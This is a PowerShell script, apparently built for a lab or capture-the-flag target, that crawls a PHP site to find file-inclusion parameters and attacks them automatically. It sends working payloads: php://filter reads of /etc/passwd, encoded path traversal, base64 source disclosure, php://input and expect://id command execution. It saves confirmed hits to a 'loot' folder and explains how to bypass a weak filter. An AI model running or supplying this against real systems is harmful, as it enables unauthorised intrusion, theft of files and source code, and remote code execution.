<#
.SYNOPSIS
    Automatic PHP LFI / stream-wrapper vulnerability scanner. Point it at a
    target with nothing else specified - it crawls the site itself to find
    candidate PHP files and GET parameters, then fuzzes each candidate with a
    battery of LFI/wrapper techniques and reports only VERIFIED hits.
.DESCRIPTION
    No -LfiPage / -Param required. The script:
      1. Crawls the web root (and one hop of links found there) and harvests
         every "<file>.php?<param>=..." pattern it sees in href/src/action
         attributes - i.e. it discovers vulnerable-looking parameters the
         same way a human clicking around the site would, rather than being
         told where to look.
      2. Falls back to a small default wordlist (common LFI param names
         against common PHP filenames) for anything the crawl didn't surface,
         in case the vulnerable parameter isn't linked anywhere in the UI.
      3. For every (file, param) candidate, tries a prioritized set of
         payloads and only reports a candidate as vulnerable when a payload
         produces a VERIFIED signal - never a bare length/baseline diff,
         which produces false positives (a redirect page that happens to
         differ in length from a calibrated baseline still isn't a real hit):
           - php://filter/resource=<ABSOLUTE PATH>   (see note below)
           - classic path traversal, several encodings/depths
           - php://filter/convert.base64-encode/resource=<the file itself>
             (source disclosure - verified by decoding to real PHP source)
           - php://input                              (POST body reflected)
           - data://                                   (inline data reflected)
           - expect://                                 (command exec at
                                                          open-time, if the
                                                          PECL extension
                                                          happens to be
                                                          loaded)
      4. Every payload is throttled with a delay - assume the target may ban
         or rate-limit bursts, so speed is never the goal.

    Why php://filter/resource=<ABSOLUTE PATH> is in here at all:
    A lot of homegrown "LFI protection" looks like this:
        if (preg_match("/^[a-z]/", $page)) {           // <- only anchors the
                                                        //    FIRST character
            $page = str_replace("../","",$page);       // <- single pass,
            $page = str_replace("./","",$page);        //    literal substring
            readfile($page);                           //    only
        }
    Both checks are satisfied by "php://filter/resource=/etc/passwd": it
    starts with the lowercase letter 'p' (passes the regex), and it contains
    no "../" or "./" substring (passes the sanitizer untouched) - yet PHP
    reads the resource= argument as an absolute path with no re-validation.
    No conversion filter is even required; bare php://filter/resource=X is a
    plain passthrough read of X. This is checked automatically against every
    discovered parameter, no hint needed.
.USAGE
    .\enum_php.ps1 -Target 10.146.184.99
    .\enum_php.ps1 -Target 10.146.184.99 -DelayMs 600
#>

param(
    [Parameter(Mandatory=$true)][string]$Target,
    [string]$Scheme  = "http",
    [int]$Port       = 80,
    [int]$DelayMs    = 400,   # pause between requests - assume the target bans/rate-limits bursts
    [int]$MaxCandidates = 40  # hard cap on total (file,param) combinations tested
)

$script:UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
$script:Sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession

$ErrorActionPreference = 'SilentlyContinue'
$outDir  = Join-Path $PSScriptRoot "loot_php_$($Target -replace '\.','_')"
New-Item -ItemType Directory -Force -Path $outDir | Out-Null
$logFile = Join-Path $outDir "enum_php.log"
"" | Out-File $logFile -Encoding utf8

function Log {
    param([string]$m, [string]$c = 'Gray')
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $line -ForegroundColor $c
    Add-Content -Path $logFile -Value $line -Encoding utf8
}
function Save {
    param([string]$name, [string]$content)
    $p = Join-Path $outDir ($name -replace '[^\w.\-]', '_')
    $content | Out-File $p -Encoding utf8
    return $p
}
function Pace { Start-Sleep -Milliseconds $DelayMs }

function Get-Http {
    param([string]$Uri, [string]$Method = 'Get', $Body, [string]$ContentType)
    $p = @{
        Uri = $Uri; Method = $Method; UseBasicParsing = $true; TimeoutSec = 20
        UserAgent = $script:UA; WebSession = $script:Sess; ErrorAction = 'Stop'
    }
    if ($PSBoundParameters.ContainsKey('Body')) { $p.Body = $Body }
    if ($ContentType)                            { $p.ContentType = $ContentType }   # empty string is falsy -> skipped
    try {
        $r = Invoke-WebRequest @p
        return [pscustomobject]@{ Status = [int]$r.StatusCode; Len = $r.Content.Length; Body = $r.Content }
    } catch {
        $resp = $_.Exception.Response
        if ($resp -and $resp.StatusCode) { return [pscustomobject]@{ Status = [int]$resp.StatusCode.value__; Len = 0; Body = '' } }
        Log ("    [EXCEPTION] $Uri :: $($_.Exception.Message)") DarkYellow
        return $null
    }
}
function Try-Decode-B64 {
    param([string]$body)
    $t = $body.Trim()
    if ($t.Length -gt 0 -and $t -match '^[A-Za-z0-9+/=\r\n]+$') {
        try { return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($t -replace '\s',''))) } catch {}
    }
    return $null
}

$base = "${Scheme}://${Target}:${Port}/"
Log "=== Automatic PHP vulnerability scan: $base ===" Cyan

# ---------------------------------------------------------------------------
# 1. CRAWL -- discover PHP files + GET parameters by reading the site itself,
#    not by being told them. This is the "stumble onto it" step: any
#    "<file>.php?<param>=<value>" pattern seen in href/src/action anywhere on
#    the crawled pages becomes a candidate.
# ---------------------------------------------------------------------------
Log "--- Crawling for PHP files and parameters ---" Cyan
$phpFiles  = New-Object 'System.Collections.Generic.HashSet[string]'
$candidates = New-Object 'System.Collections.Generic.HashSet[string]'  # "file.php|param"
$linkQueue  = New-Object 'System.Collections.Generic.HashSet[string]'
[void]$linkQueue.Add("")   # web root

function Harvest {
    param([string]$html)
    foreach ($m in [regex]::Matches($html, '(?:href|src|action)\s*=\s*["'']([^"''#]+)["'']')) {
        $u = $m.Groups[1].Value.Trim()
        if ($u -match '^(https?:|//|mailto:|javascript:)') { continue }
        $u = $u.TrimStart('/')
        if ($u -match '^([\w./\-]+\.php)\?([^=&]+)=') {
            [void]$phpFiles.Add($matches[1])
            [void]$candidates.Add("$($matches[1])|$($matches[2])")
        } elseif ($u -match '\.php$') {
            [void]$phpFiles.Add($u)
        } elseif ($u -and $u -notmatch '\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf)$') {
            [void]$linkQueue.Add($u)
        }
    }
}

$crawled = New-Object 'System.Collections.Generic.HashSet[string]'
$hops = 0
$rootFailed = $false
while ($linkQueue.Count -gt 0 -and $hops -lt 25) {
    $path = $linkQueue | Select-Object -First 1
    [void]$linkQueue.Remove($path)
    if ($crawled.Contains($path)) { continue }
    [void]$crawled.Add($path); $hops++
    $r = Get-Http ($base + $path)
    Pace
    if ($r -and $r.Body) {
        Log ("  crawled /{0}  [{1}] len={2}" -f $path, $r.Status, $r.Len) Gray
        Harvest $r.Body
    } else {
        Log ("  crawled /{0}  -> NO RESPONSE" -f $path) Red
        if ($path -eq "") { $rootFailed = $true }
    }
}
if ($rootFailed) {
    Log "WARNING: the root page itself returned no response. This almost certainly means the target" Red
    Log "is unreachable OR you are currently rate-limited/banned from earlier bursts - NOT that there" Red
    Log "is no vulnerability. Everything below this point is running blind. Stop, wait, and re-run." Red
}
if ($phpFiles.Count -eq 0) {
    [void]$phpFiles.Add("index.php")
    Log "No .php files found by crawling - falling back to default 'index.php'. If the root page loaded" Yellow
    Log "fine above but this still triggered, the real page.php may just not be linked anywhere." Yellow
}
Log ("PHP files seen: {0}" -f (($phpFiles -join ', ')))
Log ("Parameters discovered from links: {0}" -f (($candidates -join ', ')))

# Fallback: cross a small wordlist of common LFI param names against every
# discovered PHP file, in case the real parameter isn't linked in the UI.
$paramWordlist = @('page','file','path','view','template','include','doc','p','pg','document','module','action','content','load','name')
foreach ($f in $phpFiles) {
    foreach ($p in $paramWordlist) {
        [void]$candidates.Add("$f|$p")
    }
}
$candidateList = $candidates | Select-Object -First $MaxCandidates
Log ("Total candidates to test (capped at {0}): {1}" -f $MaxCandidates, $candidateList.Count) Cyan

# ---------------------------------------------------------------------------
# 2. FUZZ each (file, param) candidate with a prioritized payload set.
#    Every "hit" is verified against a real content signal, never a bare
#    length/baseline diff.
# ---------------------------------------------------------------------------
$absTargets = @('/etc/passwd')
$traversalPayloads = @(
    { param($f) '../../../../../../../../etc/passwd' },
    { param($f) '....//....//....//....//....//....//etc/passwd' },
    { param($f) '..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd' }
)

$confirmed = @()
$totalRequests = 0
$noResponseCount = 0

function Track-Response {
    param($resp)
    $script:totalRequests++
    if (-not $resp) { $script:noResponseCount++ }
}

foreach ($cand in $candidateList) {
    $parts = $cand -split '\|', 2
    $file = $parts[0]; $param = $parts[1]
    $endpoint = "${base}${file}?${param}="
    $foundForThisCandidate = $false
    Log ("candidate: $file?$param=") Cyan

    # -- 2a. php://filter/resource=<absolute path> (the anchored-regex / single-pass-sanitizer bypass)
    foreach ($t in $absTargets) {
        $resp = Get-Http ($endpoint + "php://filter/resource=$t")
        Track-Response $resp
        Pace
        if (-not $resp) {
            Log "    php://filter/resource=$t -> NO RESPONSE" Red
        } elseif ($resp.Body -match 'root:.*:0:0:') {
            Log ("CONFIRMED LFI  $file?$param=php://filter/resource=$t  (real /etc/passwd content)") Green
            Save ("CONFIRMED_" + ($file -replace '[^\w.\-]','_') + "_" + $param + "_abs_filter.txt") $resp.Body | Out-Null
            $confirmed += "$file?$param=php://filter/resource=$t"
            $foundForThisCandidate = $true
        } else {
            Log ("    php://filter/resource=$t -> [{0}] len={1} (no match)" -f $resp.Status, $resp.Len) Gray
        }
    }
    if ($foundForThisCandidate) { continue }

    # -- 2b. classic path traversal, a few encodings
    foreach ($enc in $traversalPayloads) {
        $payload = & $enc $file
        $resp = Get-Http ($endpoint + $payload)
        Track-Response $resp
        Pace
        if (-not $resp) {
            Log "    $payload -> NO RESPONSE" Red
        } elseif ($resp.Body -match 'root:.*:0:0:') {
            Log ("CONFIRMED LFI  $file?$param=$payload  (real /etc/passwd content)") Green
            Save ("CONFIRMED_" + ($file -replace '[^\w.\-]','_') + "_" + $param + "_traversal.txt") $resp.Body | Out-Null
            $confirmed += "$file?$param=$payload"
            $foundForThisCandidate = $true
            break
        } else {
            Log ("    $payload -> [{0}] len={1} (no match)" -f $resp.Status, $resp.Len) Gray
        }
    }
    if ($foundForThisCandidate) { continue }

    # -- 2c. php://filter/convert.base64-encode/resource=<the candidate file itself> -- source disclosure
    $resp = Get-Http ($endpoint + "php://filter/convert.base64-encode/resource=$file")
    Track-Response $resp
    Pace
    $dec = if ($resp) { Try-Decode-B64 $resp.Body } else { $null }
    if (-not $resp) {
        Log "    php://filter/convert.base64-encode/resource=$file -> NO RESPONSE" Red
    } elseif ($dec -and $dec -match '<\?php') {
        Log ("CONFIRMED source disclosure  $file?$param=php://filter/convert.base64-encode/resource=$file") Green
        Save ("CONFIRMED_" + ($file -replace '[^\w.\-]','_') + "_" + $param + "_source.txt") $dec | Out-Null
        $confirmed += "$file?$param=php://filter/convert.base64-encode/resource=$file"
        $foundForThisCandidate = $true
    } else {
        Log ("    php://filter/convert.base64-encode/resource=$file -> [{0}] len={1} (no match)" -f $resp.Status, $resp.Len) Gray
    }
    if ($foundForThisCandidate) { continue }

    # -- 2d. php://input -- POST body reflected back
    $marker = "PROBE_$(Get-Random)"
    $resp = Get-Http -Uri ($endpoint + "php://input") -Method 'Post' -Body $marker -ContentType 'text/plain'
    Track-Response $resp
    Pace
    if (-not $resp) {
        Log "    php://input -> NO RESPONSE" Red
    } elseif ($resp.Body -match [regex]::Escape($marker)) {
        Log ("  $file?$param=php://input reflects POST body (read-only stream access confirmed, not by itself RCE)") Yellow
        $confirmed += "$file?$param=php://input (read-only)"
    } else {
        Log ("    php://input -> [{0}] len={1} (no match)" -f $resp.Status, $resp.Len) Gray
    }

    # -- 2e. expect:// -- direct command exec at open-time (real RCE if the PECL extension is loaded)
    $resp = Get-Http ($endpoint + "expect://id")
    Track-Response $resp
    Pace
    if (-not $resp) {
        Log "    expect://id -> NO RESPONSE" Red
    } elseif ($resp.Body -match 'uid=\d+') {
        Log ("CONFIRMED RCE  $file?$param=expect://id  -> $($resp.Body.Trim())") Green
        Save ("CONFIRMED_" + ($file -replace '[^\w.\-]','_') + "_" + $param + "_expect.txt") $resp.Body | Out-Null
        $confirmed += "$file?$param=expect://id"
    } else {
        Log ("    expect://id -> [{0}] len={1} (extension not loaded)" -f $resp.Status, $resp.Len) Gray
    }
}

Log "=== Done. Loot: $outDir ===" Cyan
Log ("Requests sent: {0}   No-response: {1}" -f $totalRequests, $noResponseCount) Cyan
if ($totalRequests -gt 0 -and ($noResponseCount / $totalRequests) -gt 0.3) {
    Log "WARNING: over 30% of requests got NO RESPONSE. This run was likely rate-limited/banned partway" Red
    Log "through - do not trust a 'no hits' result from this run. Wait a few minutes and re-run with a" Red
    Log "larger -DelayMs instead of concluding the target isn't vulnerable." Red
}
if ($confirmed.Count -eq 0) {
    Log "No verified hits. Consider: raising -MaxCandidates, adding to `$paramWordlist, or re-running with" Yellow
    Log "a larger -DelayMs if the warning above fired." Yellow
} else {
    Log "--- VERIFIED FINDINGS ---" Cyan
    $confirmed | ForEach-Object { Log "  $_" Green }
}
